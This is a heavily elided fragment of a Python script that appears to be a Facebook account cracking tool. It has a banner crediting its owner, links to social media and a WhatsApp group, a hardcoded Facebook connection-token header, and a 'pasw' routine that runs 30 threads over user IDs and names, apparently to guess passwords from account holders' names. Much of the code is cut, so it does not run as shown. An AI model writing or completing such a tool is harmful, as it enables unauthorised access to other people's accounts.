...
from concurrent.futures import ThreadPoolExecutor as sarfrazSIYAM
from string import * 
...
\033[1;37m    ######      ######     ########  
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Siyam Ahmed
\033[1;37m Facebook:            Siyam Ahmed
\033[1;37m Github  :            siyamffofficial
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/CJF8dV3SzMVEPGFyAnwUBu')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/siyam.ff.official100k')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SIYAM(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazSIYAM(max_workers=30) as SIYAMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    os.system('sort -r '+SIYAM+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
